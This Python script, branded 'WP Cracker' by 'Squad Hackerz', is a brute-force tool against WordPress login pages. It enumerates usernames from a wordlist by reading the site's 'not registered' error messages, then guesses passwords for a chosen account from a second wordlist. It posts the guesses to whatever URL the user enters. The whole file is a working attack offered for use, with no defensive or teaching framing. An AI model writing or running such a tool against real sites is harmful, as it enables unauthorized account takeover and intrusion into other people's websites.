import sys
import requests
import pyfiglet
import json
import os
from termcolor import *
os.system('color')
os.system('ClS')
os.system('TITLE WP Cracker')
print(f"{colored('=======================================', 'blue')}")
print(f"{colored('WP Cracker', 'blue', attrs=['bold'])}")
print(f"{colored('=======================================', 'blue')}")
cprint("Powered By Squad Hackerz", "white", "on_red")
print("")
print("")

def login(url):
    global inde
    inde = 0
    s= requests.Session()
    with open('./res/uname.txt', 'r') as wordlists:
        for line in wordlists:
            for word in line.split():
                global mail
                mail = word
                f = open('./res/res.txt', 'w')
                payload = {
                        'log' : mail,
                        'pwd' : 'xxxxxxxxxxx',
                        'wp-submit' : 'Log+In'
                    }
                res = s.post(url, data=payload)
                ps = str(res.content)
                f.write(ps)
                f.close()
                os.system('ClS')
                print(f"{colored('=======================================', 'blue')}")
                print(f"{colored('WP Cracker (Admin Cracker)', 'blue', attrs=['bold'])}")
                print(f"{colored('=======================================', 'blue')}")
                cprint("Powered By Squad Hackerz", "white", "on_red")
                print("")
                print("")
                print(f"{colored('Trying', 'white')} {colored(mail, 'yellow', attrs=['bold'])}")
                with open(r'./res/res.txt','r') as fp:
                    lines = fp.readlines()
                    for row in lines:
                        word = 'is not registered on this site.'
                        if row.find(word) == -1:
                            os.system('ClS')
                            print(f"{colored('=======================================', 'blue')}")
                            print(f"{colored('WP Cracker (Admin Cracker)', 'blue', attrs=['bold'])}")
                            print(f"{colored('=======================================', 'blue')}")
                            cprint("Powered By Squad Hackerz", "white", "on_red")
                            print("")
                            print("")
                            print(f"{colored('----------------------------', 'red')}")
                            print(f"{colored('----------------------------', 'green')}")
                            print(f"{colored('----------------------------', 'green')}")
                            print(f"{colored('Username is', 'green')} {colored(mail, 'yellow')}")
                            print(f"{colored('----------------------------', 'green')}")
                            print(f"{colored('----------------------------', 'green')}")
                            print(f"{colored('----------------------------', 'red')}")
                            inde = 1
                            break
                if inde == 1:
                        break
            if inde == 1:
                    break
    return s


def login2(url, mail):
    global inde
    inde = 0
    s= requests.Session()
    with open('./res/pass.txt', 'r') as wordlists:
        for line in wordlists:
            for word in line.split():
                global passwd
                passwd = word
                f = open('./res/res2.txt', 'w')
                payload = {
                        'log' : mail,
                        'pwd' : passwd,
                        'wp-submit' : 'Log+In'
                    }
                res = s.post(url, data=payload)
                ps = str(res.content)
                f.write(ps)
                f.close()
                os.system('ClS')
                print(f"{colored('=======================================', 'blue')}")
                print(f"{colored('WP Cracker (Pass Cracker)', 'blue', attrs=['bold'])}")
                print(f"{colored('=======================================', 'blue')}")
                cprint("Powered By Squad Hackerz", "white", "on_red")
                print("")
                print("")
                print(f"{colored('Trying', 'white')} {colored(passwd, 'yellow', attrs=['bold'])}")
                with open(r'./res/res2.txt','r') as fp:
                    lines = fp.readlines()
                    for row in lines:
                        word = 'The password you entered for the username <strong>' + mail +'</strong> is incorrect.'
                        if row.find(word) == -1:
                            os.system('ClS')
                            print(f"{colored('=======================================', 'blue')}")
                            print(f"{colored('WP Cracker (Pass Cracker)', 'blue', attrs=['bold'])}")
                            print(f"{colored('=======================================', 'blue')}")
                            cprint("Powered By Squad Hackerz", "white", "on_red")
                            print("")
                            print("")
                            print(f"{colored('--------------------------------------', 'red')}")
                            print(f"{colored('--------------------------------------', 'green')}")
                            print(f"{colored('----------------------------', 'green')}")
                            print(f"{colored('Password for', 'green', attrs=['bold'])} {colored(mail, 'red', attrs=['bold'])} {colored('is','green', attrs=['bold'])} {colored(passwd, 'yellow', attrs=['bold'])}")
                            print(f"{colored('--------------------------------------', 'green')}")
                            print(f"{colored('--------------------------------------', 'green')}")
                            print(f"{colored('--------------------------------------', 'red')}")
                            inde = 1
                            break
                if inde == 1:
                    break
            if inde == 1:
                break
    return s


def menu(c):
    global uchoice
    uchoice = c
    

if __name__ == "__main__":
    arg = sys.argv
    print(f"{colored('~ Menu ~','green', attrs=['bold','underline'])}")
    print("")
    print("1. Crack WordPress Username")
    print("2. Crack WordPress Password")
    print("")
    print("99. Exit")
    print("")
    cchoice = input(":- ")
    menu(cchoice)

def choice():
    if uchoice == '1':
        os.system('ClS')
        print(f"{colored('=======================================', 'blue')}")
        print(f"{colored('WP Cracker (Admin Cracker)', 'blue', attrs=['bold'])}")
        print(f"{colored('=======================================', 'blue')}")
        cprint("Powered By Squad Hackerz", "white", "on_red")
        print("")
        print("")
        print("----------------------------------------")
        url = input("url : ")
        print("\n")
        session = login(url)
    elif uchoice == '2':
        os.system('ClS')
        print(f"{colored('=======================================', 'blue')}")
        print(f"{colored('WP Cracker (Pass Cracker)', 'blue', attrs=['bold'])}")
        print(f"{colored('=======================================', 'blue')}")
        cprint("Powered By Squad Hackerz", "white", "on_red")
        print("")
        print("")
        print("----------------------------------------")
        url = input("url : ")
        mail = input("username : ")
        print("\n")
        session = login2(url, mail)
    elif uchoice == '99' or uchoice == 'exit' or uchoice == "Exit" or uchoice == "EXIT":
        exit()

choice()
